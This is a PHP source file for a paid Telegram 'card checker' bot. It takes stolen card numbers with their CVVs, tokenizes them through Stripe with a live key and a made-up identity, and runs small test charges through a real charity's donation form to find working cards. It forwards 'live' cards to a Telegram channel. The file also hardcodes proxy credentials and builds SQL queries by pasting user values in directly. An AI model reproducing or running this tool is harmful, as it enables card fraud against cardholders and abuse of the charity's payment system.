<?php
if (strpos($message, ".low") === 0 || strpos($message, "/low") === 0) {
    //----------PERSONAL ACCESS--------------/
    $link = mysqli_connect($host, $dbuser, $dbpass, $dbname);
    $sql = "SELECT role FROM persons WHERE userid='$userId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
        $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"', '"')));
    if ($chatId == $userId and $role == 'FREE') {
        $pers = "PREMIUM REQUIRED! CONTACT @ASUR_SINCHAN OR /buy";
        reply_to($chatId, $pers, $message_id);
        exit();
    } elseif (empty($role)) {
        reply_to($chatId, $noregister, $message_id);
        exit();
    }
    //------------GROUP AUTHORIED SECTION-----/
    $link = mysqli_connect($host, $dbuser, $dbpass, $dbname);
    $sql = "SELECT * FROM chatauth WHERE chatsid='$chatId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
        $json_array[] = $row;
    }
    $fchatid = json_encode($json_array);
    $achat = trim(strip_tags(getStr($fchatid, '"chatsid":"', '"')));
    if ($achat != $chatId and $ctype == "supergroup") {
        $respchat = "PREMIUM REQUIRED! CONTACT @ASUR_SINCHAN";
        reply_to($chatId, $respchat, $message_id);
        exit();
    }
    //Timer Started --------//
    $starttime = microtime(true);
    $mytime = 'time1';
    $lista = substr($message, 5);
    $lista = clean($lista);
    $check = strlen($lista);
    $chem = substr($lista, 0, 1);
    $cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
    $strlenn = strlen($cc);
    $strlen1 = strlen($mes);
    $ano1 = $ano;
    $vaut = array(1, 2, 7, 8, 9, 0);
    if (in_array($chem, $vaut)) {
        reply_to($chatId, $validauth, $message_id);
        exit();
    }
    if (empty($lista)) {
        reply_to($chatId, $validauth, $message_id);
        exit();
    } elseif ($check < 15) {
        reply_to($chatId, $validauth, $message_id);
        exit();
    } elseif (strlen($strlenn != 16)) {
        reply_to($chatId, $validauth, $message_id);
        exit();
    }
    if (strlen($strlen1 > 2)) {
        $ano = $cvv;
        $cvv = $mes;
        $mes = $ano1;
    }
    //-----------CREDITS CHECK SECTION----------/
    $link = mysqli_connect($host, $dbuser, $dbpass, $dbname);
    $sql = "SELECT credits FROM persons WHERE userid='$userId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
        $json_array[] = $row;
    }
    $final2 = json_encode($json_array);
    $client = trim(strip_tags(getStr($final2, '"credits":"', '"')));
    mysqli_close($link);
    if ($client < 5) {
        reply_to($chatId, $nocredits, $message_id);
        exit();
    } elseif (empty($client)) {
        reply_to($chatId, $noregister, $message_id);
        exit();
    }
    //----------ANTISPAM SECTION---------------/
    $starttime = microtime(true);
    $mytime = 'time1';
    $link = mysqli_connect($host, $dbuser, $dbpass, $dbname);
    $sql = "SELECT time FROM persons WHERE userid='$userId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
        $json_array[] = $row;
    }
    $final20 = json_encode($json_array);
    $times = trim(strip_tags(getStr($final20, '"time":"', '"')));
    mysqli_close($link);

    $link = mysqli_connect($host, $dbuser, $dbpass, $dbname);
    $sql = "SELECT role FROM persons WHERE userid='$userId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
        $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"', '"')));
    mysqli_close($link);
    $current = time();
    $sec = $current - $times;
    if ($role == 'PREMIUM' and $sec < 5) {
        $after = 5 - $sec;
        $antispam = urlencode("ANTISPAM! TRY AGAIN AFTER $after SECONDS.");
        reply_to($chatId, $antispam, $message_id);
        exit();
    } elseif ($role == 'FREE' and $sec < 30) {
        $after = 30 - $sec;
        $antispam = urlencode("ANTISPAM! TRY AGAIN AFTER $after SECONDS AND BUY PREMIUM FROM @ASUR_SINCHAN.");
        reply_to($chatId, $antispam, $message_id);
        exit();
    } //--------------ANTISPAM END----------------/
    $pusername = 'mani48314emvl122715';
    $ppassword = '2RRj6CQL8FryyJ3F';
    $port = 9989;
    $super_proxy = 'isp2.hydraproxy.com';
    $editsms = urlencode("<b>✮𝖈𝖍𝖆𝖗𝖌𝖊 0.30$

    ➺ Card - <code>$cc|$mes|$ano|$cvv</code> 
    ➺ Status - 𝑳𝒐𝒂𝒅𝒊𝒏𝒈 ⬣ 
</b>");
    $sss = reply_to($chatId, $editsms, $message_id);
    $respon = json_decode($sss, TRUE);
    $message_id_1 = $respon['result']['message_id'];

    //------------STARTED CHECKING------//

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname1 = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email1 = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1, 3);
$numero2 = substr($phone, 6, 3);
$numero3 = substr($phone, 10, 4);
$phone = $numero1 . '' . $numero2 . '' . $numero3;
$serve_arr = array("gmail.com", "hotmail.com", "yahoo.com", "outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email1 = str_replace("example.com", $serv_rnd, $email1);
if ($state == "Alabama") {
    $state = "AL";
} else if ($state == "alaska") {
    $state = "AK";
} else if ($state == "arizona") {
    $state = "AR";
} else if ($state == "california") {
    $state = "CA";
} else if ($state == "olorado") {
    $state = "CO";
} else if ($state == "connecticut") {
    $state = "CT";
} else if ($state == "delaware") {
    $state = "DE";
} else if ($state == "district of columbia") {
    $state = "DC";
} else if ($state == "florida") {
    $state = "FL";
} else if ($state == "georgia") {
    $state = "GA";
} else if ($state == "hawaii") {
    $state = "HI";
} else if ($state == "idaho") {
    $state = "ID";
} else if ($state == "illinois") {
    $state = "IL";
} else if ($state == "indiana") {
    $state = "IN";
} else if ($state == "iowa") {
    $state = "IA";
} else if ($state == "kansas") {
    $state = "KS";
} else if ($state == "kentucky") {
    $state = "KY";
} else if ($state == "louisiana") {
    $state = "LA";
} else if ($state == "maine") {
    $state = "ME";
} else if ($state == "maryland") {
    $state = "MD";
} else if ($state == "massachusetts") {
    $state = "MA";
} else if ($state == "michigan") {
    $state = "MI";
} else if ($state == "minnesota") {
    $state = "MN";
} else if ($state == "mississippi") {
    $state = "MS";
} else if ($state == "missouri") {
    $state = "MO";
} else if ($state == "montana") {
    $state = "MT";
} else if ($state == "nebraska") {
    $state = "NE";
} else if ($state == "nevada") {
    $state = "NV";
} else if ($state == "new hampshire") {
    $state = "NH";
} else if ($state == "new jersey") {
    $state = "NJ";
} else if ($state == "new mexico") {
    $state = "NM";
} else if ($state == "new york") {
    $state = "LA";
} else if ($state == "north carolina") {
    $state = "NC";
} else if ($state == "north dakota") {
    $state = "ND";
} else if ($state == "Ohio") {
    $state = "OH";
} else if ($state == "oklahoma") {
    $state = "OK";
} else if ($state == "oregon") {
    $state = "OR";
} else if ($state == "pennsylvania") {
    $state = "PA";
} else if ($state == "rhode Island") {
    $state = "RI";
} else if ($state == "south carolina") {
    $state = "SC";
} else if ($state == "south dakota") {
    $state = "SD";
} else if ($state == "tennessee") {
    $state = "TN";
} else if ($state == "texas") {
    $state = "TX";
} else if ($state == "utah") {
    $state = "UT";
} else if ($state == "vermont") {
    $state = "VT";
} else if ($state == "virginia") {
    $state = "VA";
} else if ($state == "washington") {
    $state = "WA";
} else if ($state == "west virginia") {
    $state = "WV";
} else if ($state == "wisconsin") {
    $state = "WI";
} else if ($state == "wyoming") {
    $state = "WY";
} else {
    $state = "KY";
}


function random($length = 8)
{
    return substr(str_shuffle(str_repeat($x = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length / strlen($x)))), 1, $length);
}

$email = '' . random() . '@gmail.com';

// echo $email;

# -------------------- [1 REQ] -------------------#





$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authority: api.stripe.com',
    'method: POST',
    'path: /v1/tokens',
    'scheme: https',
    'accept: application/json',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/x-www-form-urlencoded',
    'cookie: ',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');

# -------------------- [2 REQ] -------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'time_on_page=153352&guid=77f6da60-2ece-4aa2-987f-2328d0aaf4fdbe9471&muid=ea8c9633-5e30-4e10-a8f9-c4e2ed4a4b310310b7&sid=56f56dcb-d7fd-4671-ae7a-f5d61027c71b124daf&key=pk_live_51IYmPsHxn2F7nVO7dyALP7JQH3sPhNAKtPtmYfeDzWQ1ytK5Jtg38ouXObsnI7GqWLdi3d4iPU28MLVEOFc3W14900pEGhlPMM&payment_user_agent=stripe.js%2F78ef418&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');



$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1, '"id": "', '"')));

$editmsg = urlencode("<b>✮𝖈𝖍𝖆𝖗𝖌𝖊 0.30$

    ➺ Card - <code>$cc|$mes|$ano|$cvv</code> 
    ➺ Status - 𝑳𝒐𝒂𝒅𝒊𝒏𝒈 ⬣⬣

</b>");
    edit_message($chatId, $editmsg, $message_id_1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.harekrishnaperth.com/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'cookie: trx_addons_is_retina=0; __stripe_sid=56f56dcb-d7fd-4671-ae7a-f5d61027c71b124daf; __stripe_mid=ea8c9633-5e30-4e10-a8f9-c4e2ed4a4b310310b7',
    'origin: https://www.harekrishnaperth.com',
    'referer: https://www.harekrishnaperth.com/donate/',
    'sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-gpc: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=wp_full_stripe_payment_charge&formName=Community_Center_Project&fullstripe_email=tgurujj%40gmail.com&fullstripe_custom_amount=0.5&fullstripe_name=sdcf+dskfsd&stripeToken='.$id.'');


    $result2a = curl_exec($ch);

    curl_close($ch);

    //--------------2 REQ SECTION---------------/
    $editmsg = urlencode("<b>✮𝖈𝖍𝖆𝖗𝖌𝖊 0.30$

    ➺ Card - <code>$cc|$mes|$ano|$cvv</code> 
    ➺ Status - 𝑳𝒐𝒂𝒅𝒊𝒏𝒈 ⬣⬣⬣

</b>");
    edit_message($chatId, $editmsg, $message_id_1);
    //-----------BIN LOOKUP SECTION----------//

    $cctwoa = substr("$cc", 0, 6);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$pusername:$ppassword");
    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/' . $cctwoa . '');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: lookup.binlist.net',
        'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
    ));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '');
    $fim = curl_exec($ch);
    $bank = GetStr($fim, '"bank":{"name":"', '"');
    $name = GetStr($fim, '"name":"', '"');
    $brand = GetStr($fim, '"brand":"', '"');
    $country = GetStr($fim, '"country":{"name":"', '"');
    $emoji = GetStr($fim, '"emoji":"', '"');
    $scheme = GetStr($fim, '"scheme":"', '"');
    $type = GetStr($fim, '"type":"', '"');
    $currency = GetStr($fim, '"currency":"', '"');
    ///$test2 = GetStr($fim, '"alpha2":"', '"'); ////country abbreviated example (US)
    if (strpos($fim, '"type":"credit"') !== false) {
        $bin = 'Credit';
    } else {
        $bin = 'Debit';
    }
    //IF BIN ARE NOT AVAILABLE ----//
    if (empty($scheme)) {
        $scheme = "N/A";
    }
    if (empty($type)) {
        $type = "N/A";
    }
    if (empty($brand)) {
        $brand = "N/A";
    }
    if (empty($bank)) {
        $bank = "N/A";
    }
    if (empty($name)) {
        $name = "N/A";
    }
    if (empty($emoji)) {
        $emoji = "N/A";
    }
    if (empty($currency)) {
        $currency = "N/A";
    }




    curl_close($ch);


    //--------------RESPONSE SECTION----------//

    $mtc = "-1001526549384";

    if ((strpos($result2a, 'incorrect_zip')) || (strpos($result2a, 'Your card zip code is incorrect.')) || (strpos($result2a, 'The zip code you supplied failed validation.'))) {
        $status = "Live 🟡";
        $response = "Zip Mismatch ❎";
    } elseif (strpos($result2a, 'success":true,"error":"requires_capture')) {
        $status = "Live 🟢";
        $response = "Payment Successful ✅";
        $yehi = urlencode("𝗖𝗣 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ♻️️
𝗖𝗮𝗿𝗱➔<code>$cc|$mes|$ano|$cvv</code>
𝗥𝗘𝗦𝗨𝗟𝗧➔<b>Charged 0.30$ ✅</b>");
        hits_to($mtc, $yehi);
    } elseif ((strpos($result2a, '"cvc_check": "pass"')) || (strpos($result2a, '"success":true')) || (strpos($result2a, '/donations/thank_you?donation_number='))) {
        $status = "Live 🟢";
        $response = "CVV LIVE ✅";
        $yehi = urlencode("𝗖𝗣 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ♻️️
𝗖𝗮𝗿𝗱➔<code>$cc|$mes|$ano|$cvv</code>
𝗥𝗘𝗦𝗨𝗟𝗧➔<b>CVV LIVE ✅</b>");
        hits_to($mtc, $yehi);
    } elseif ((strpos($result2a, "Your card has insufficient funds.")) || (strpos($result2a, "insufficient_funds"))) {
        $status = "Live 🟢";
        $response = "Insufficient Funds ❎";
        $yehi = urlencode("𝗖𝗣 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ♻️️
𝗖𝗮𝗿𝗱➔<code>$cc|$mes|$ano|$cvv</code>
𝗥𝗘𝗦𝗨𝗟𝗧➔<b>Insufficient Funds ✅</b>");
        hits_to($mtc, $yehi);
    } elseif ((strpos($result2a, "Your card's security code is incorrect.")) || (strpos($result2a, "incorrect_cvc")) || (strpos($result2a, "The CVC number is incorrect."))) {
        $status = "Live 🟡";
        $response = "CCN Live ❎";
    } elseif ((strpos($result2a, "Your card does not support this type of purchase.")) || (strpos($result2a, "transaction_not_allowed"))) {
        $status = "Live 🟡";
        $response = "Card Doesn't Support Purchase ❎";
    } elseif (strpos($result2a, "do_not_honor")) {

        $status = "Dead 🔴";
        $response = "Do Not Honor 🚫";
    } elseif (strpos($result2a, "stolen_card")) {

        $status = "Dead 🔴";
        $response = "Stolen Card 🚫";
    } elseif (strpos($result2a, "lost_card")) {
        $status = "Dead 🔴";
        $response = "Lost Card 🚫";
    } elseif (strpos($result2a, "pickup_card")) {
        $status = "Dead 🔴";
        $response = "Pickup Card 🚫";
    } elseif ((strpos($result2a, 'The card number is incorrect.')) || (strpos($result2a, 'Your card number is incorrect.')) || (strpos($result2a, 'incorrect_number'))) {

        $status = "Dead 🔴";
        $response = "Incorrect Card Number 🚫";
    } elseif ((strpos($result2a, 'Your card has expired.')) || (strpos($result2a, 'expired_card'))) {
        $status = "Dead 🔴";
        $response = "Expired Card 🚫";
    } elseif (strpos($result2a, "generic_decline")) {
        $status = "Dead 🔴";
        $response = "Generic Decline 🚫";
    } elseif (strpos($result1, "generic_decline")) {
        $status = "Dead 🔴";
        $response = "Generic Decline 🚫";
    } elseif (strpos($result2a, "fraudulent")) {
        $status = "Dead 🔴";
        $response = "Fraudulent 🚫";
    } elseif (strpos($result2a, "lock_timeout")) {
        $status = "Dead 🔴";
        $response = "error 404 🚫";
    } elseif ((strpos($result2a, "Your card was declined.")) || (strpos($result2a, 'The card was declined.'))) {
        $status = "Dead 🔴";
        $response = "Generic Decline 🚫";
    } elseif (strpos($result2a, "intent_confirmation_challenge")) {
        $status = "Dead 🔴";
        $response = "Captcha 😥";
    } elseif (strpos($result2a, "stripe_3ds2_fingerprint")) {
        $status = "Live 🟡";
        $response = "3D Secured ❎";
    } elseif (strpos($result2a, "payment_requires_sca")) {
        $status = "Live 🟡";
        $response = "3D Secured ❎";
    } elseif (strpos($result2a, "parameter_invalid_empty")) {
        $status = "Dead 🔴";
        $response = "404 error 🚫";
    } elseif (strpos($result2a, "invalid_request_error")) {
        $status = "Dead 🔴";
        $response = "404 error 🚫";
    } else {
        $status = "Dead 🔴";
        $response = "Generic Error 🚫";
    }
    //SEND --------------RESPONSE--------//

    $editmsg = urlencode("<b>✮𝖈𝖍𝖆𝖗𝖌𝖊
❆═══»ᴀꜱᴜʀ CHKV2«═══❆
✮ᴄᴀʀᴅ -» <code>$cc|$mes|$ano|$cvv</code> 
✮STATUS-» $status
✮ƦESPONSE -» $response
✮GATEWAY -» Stripe Charge 0.30$
-———-»ɪɴꜰᴏ«-———-
✮ʙɪɴ -» $cctwoa - $scheme 
✮ᴅᴀᴛᴀ -» $brand $type
✮ʙᴀɴᴋ -» $bank
✮ᴄᴏᴜɴᴛʀʏ -» $name $emoji $currency
❆═══»ᴀꜱᴜʀ CHKV2«═══❆
✮ᴛɪᴍᴇ ɪɴ ᴘʀᴏɢʀᴇꜱꜱ -  {$mytime($starttime)}sec
✮ᴄʜᴇᴄᴋᴇᴅ ʙʏ: 😈 <a href='tg://user?id=$userId'>$firstname</a> 😈 ✅️ [$role]
✮ᴏᴡɴᴇʀ -» @asur_sinchan
    －－－－－－－－－－－－－－－－</b>");
    edit_message($chatId, $editmsg, $message_id_1);


    //-----------CREDIT DEDUCT SECTION---------//
    $link = mysqli_connect($host, $dbuser, $dbpass, $dbname);
    $sql = "SELECT credits FROM persons WHERE userid='$userId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
        $json_array[] = $row;
    }
    $final2 = json_encode($json_array);
    $client = trim(strip_tags(getStr($final2, '"credits":"', '"')));
    mysqli_close($link);
    $balance = $client - 1;

    $link = mysqli_connect($host, $dbuser, $dbpass, $dbname);
    $sql = "UPDATE persons SET credits = '$balance' WHERE persons.userid='$userId'";
    $result = mysqli_query($link, $sql);
    mysqli_close($link);
    //--------NEW TIME SET SECTION ----------//
    $timest = time();
    $link = mysqli_connect($host, $dbuser, $dbpass, $dbname);
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$userId'";
    $result21 = mysqli_query($link, $sql);
    mysqli_close($link);
    exit();
}

